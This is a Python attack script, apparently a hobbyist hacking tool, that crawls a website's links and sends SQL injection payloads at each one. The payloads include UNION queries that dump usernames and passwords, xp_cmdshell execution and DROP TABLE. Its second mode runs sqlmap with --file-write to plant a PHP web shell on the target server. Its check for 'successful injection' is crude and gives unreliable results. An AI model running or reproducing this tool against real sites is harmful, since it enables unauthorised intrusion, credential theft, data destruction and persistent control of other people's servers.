import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import os
import subprocess
import webbrowser
import time
import sys
from concurrent.futures import ThreadPoolExecutor

# ASCII Art
ASCII_ART = r"""
  .=-.-.  .-._              _,---.    .=-.-.              ,--.--------.                   ,---.       ,--.--------.       ,----.           ,-.--, 
 /==/_ / /==/ \  .-._    .-`.' ,  \  /==/_ /    _.-.     /==/,  -   , -\   .-.,.---.    .--.'  \     /==/,  -   , -\   ,-.--` , \ .--.-.  /=/, .' 
|==|, |  |==|, \/ /, /  /==/_  _.-' |==|, |   .-,.'|     \==\.-.  - ,-./  /==/  `   \   \==\-/\ \    \==\.-.  - ,-./  |==|-  _.-` \==\ -\/=/- /   
|==|  |  |==|-  \|  |  /==/-  '..-. |==|  |  |==|, |      `--`\==\- \    |==|-, .=., |  /==/-|_\ |    `--`\==\- \     |==|   `.-.  \==\ `-' ,/    
|==|- |  |==| ,  | -|  |==|_ ,    / |==|- |  |==|- |           \==\_ \   |==|   '='  /  \==\,   - \        \==\_ \   /==/_ ,    /   |==|,  - |    
|==| ,|  |==| -   _ |  |==|   .--'  |==| ,|  |==|, |           |==|- |   |==|- ,   .'   /==/ -   ,|        |==|- |   |==|    .-'   /==/   ,   \   
|==|- |  |==|  /\ , |  |==|-  |     |==|- |  |==|- `-._        |==|, |   |==|_  . ,'.  /==/-  /\ - \       |==|, |   |==|_  ,`-._ /==/, .--, - \  
/==/. /  /==/, | |- |  /==/   \     /==/. /  /==/ - , ,/       /==/ -/   /==/  /\ ,  ) \==\ _.\=\.-'       /==/ -/   /==/ ,     / \==\- \/=/ , /  
`--`-`   `--`./  `--`  `--`---'     `--`-`   `--`-----'        `--`--`   `--`-`--`--'   `--`               `--`--`   `--`-----``   `--`-'  `--`   
Made by Ze1glerf | Github : Ze1glerf
"""

def create_log_directory():
    if not os.path.exists("logs"):
        os.makedirs("logs")

def find_links(url):
    parsed_url = urlparse(url)
    base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        for a_tag in soup.find_all('a', href=True):
            link = urljoin(url, a_tag['href'])
            if link.startswith(('http://', 'https://')) and link.startswith(base_domain):
                links.add(link)
        return links
    except Exception as e:
        print(f"Error: {e}")
        return []

def test_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "' UNION SELECT NULL, username, password FROM users -- ",
        "' OR 'a'='a",
        "' OR '1'='1' AND '1'='1",
        "'; EXEC xp_cmdshell('dir') -- ",
        "'; DROP TABLE users; -- ",
        "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
        "' UNION SELECT database(), version() -- ",
        "' UNION SELECT NULL, NULL, @@version -- ",
        "' AND 0=0 -- ",
        "' AND SLEEP(5) -- ",
    ]
    
    results = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_payload = {executor.submit(requests.get, f"{url}?username={payload}"): payload for payload in payloads}

        for future in future_to_payload:
            payload = future_to_payload[future]
            try:
                response = future.result()
                if response.status_code == 200:
                    if "error" not in response.text.lower():
                        results.append(f"Successful injection: {payload} -> {url}")
            except Exception as e:
                results.append(f"Error: {str(e)}")

    return results

def log_results(url, results):
    safe_url = url.replace("http://", "").replace("https://", "").replace("/", "_")
    log_file = f"logs/{safe_url}.txt"

    with open(log_file, 'w') as f:
        for result in results:
            f.write(result + '\n')

    print(f"Results logged in: 'logs/{safe_url}.txt'.")

def upload_shell(target_url, shell_path):
    try:
        command = f"sqlmap -u '{target_url}' --file-write='{shell_path}' --file-dest='/path/to/upload/directory/shell.php' --batch"
        
        print("Uploading shell, please wait...")
        
        for i in range(101):
            time.sleep(0.05)
            sys.stdout.write(f"\r[{'#' * (i // 2)}{' ' * (50 - i // 2)}] {i}%")
            sys.stdout.flush()

        subprocess.run(command, shell=True)
        print(f"\nShell uploaded: {shell_path} -> {target_url}")
        return True
    except Exception as e:
        print(f"Error: {str(e)}")
        return False

def clear_chat_history():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear_chat_history()
    print(ASCII_ART)
    create_log_directory()

    print("Options:")
    print("1 - Scan for SQL Injection Vulnerabilities")
    print("2 - Upload Shell to Vulnerable Page")
    choice = input("Please make your choice (1 or 2): ")

    if choice == '1':
        target_url = input("Enter the URL to scan: ")
        links = find_links(target_url)

        all_results = []

        def scan_link(link):
            print(f"Starting scan on: {link}")
            return test_sql_injection(link)

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = list(executor.map(scan_link, links))

        for result in futures:
            all_results.extend(result)

        if all_results:
            print("\nResults from scan:")
            for result in all_results:
                print(result)
            log_results(target_url, all_results)
        else:
            print("No SQL injection vulnerabilities found.")

    elif choice == '2':
        shells = os.listdir('shells')
        print("Available shells:")
        for index, shell in enumerate(shells, start=1):
            print(f"{index} - {shell}")
        
        shell_choice = int(input("Select the shell you want to upload: ")) - 1
        if 0 <= shell_choice < len(shells):
            shell_path = shells[shell_choice]
            target_url = input("Enter the URL of the vulnerable page: ")
            if upload_shell(target_url, shell_path):
                webbrowser.open(f"/path/to/upload/directory/shell.php")
        else:
            print("Invalid selection.")

if __name__ == "__main__":
    main()
